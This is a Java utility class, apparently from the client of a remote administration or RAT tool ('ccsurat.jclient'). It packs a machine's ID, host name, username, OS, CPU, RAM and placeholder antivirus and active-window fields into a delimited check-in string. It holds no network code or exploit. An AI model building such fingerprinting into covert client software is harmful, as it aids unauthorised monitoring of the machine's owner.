/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ccsurat.jclient;

import java.util.UUID;
import java.net.InetAddress;
import org.hyperic.sigar.*;

/**
 *
 * @author gotoel
 */
public class SystemUtils {
    public static String SystemInfo()
    {
        System.getProperties().list(System.out);
        String info = "";
        info += getGUID() + "|*|";
        info += "Java" + "|*|";
        info += getComputerName() + "|*|";
        info += getUsername() + "|*|";
        info += getOS() + "|*|";
        info += getCPU() + "|*|";
        info += getRAM() + "|*|";
        info += "AV" + "|*|";
        info += "ActiveWindow" + "|*|";
        return info;
    }
    
    private static String getGUID()
    {
        return UUID.randomUUID().toString().substring(0,8).toUpperCase();
    }
    
    private static String getRAM()
    {
        Mem mem = null;
        try{ 
            Sigar sigar = new Sigar();
            mem = sigar.getMem();
        } catch(Exception ex)
        {
        }
        return (mem.getRam() / 1000) + " GB";
    }
    
    private static String getOS()
    {
        return System.getProperty("os.name") + " " + (System.getProperty("sun.arch.data.model").equals("64") ? "64-bit" : "32-bit"); 
    }
    
    private static String getUsername()
    {
        return System.getProperty("user.name");
    }
    
    private static String getComputerName()
    {
        String pcName = "";
        try{ 
            pcName = InetAddress.getLocalHost().getHostName();
        } catch(Exception ex)
        {
        }
        return pcName;
    }
    
    private static String getCPU()
    {   
        CpuInfo[] cpuInfoList = null;
        try{ 
            Sigar sigar = new Sigar();
            cpuInfoList = sigar.getCpuInfoList();
        } catch(Exception ex)
        {
        }
        for(org.hyperic.sigar.CpuInfo info : cpuInfoList){
            return info.getVendor() + " " + info.getModel();
        }
        return "Not Found";
    }
}
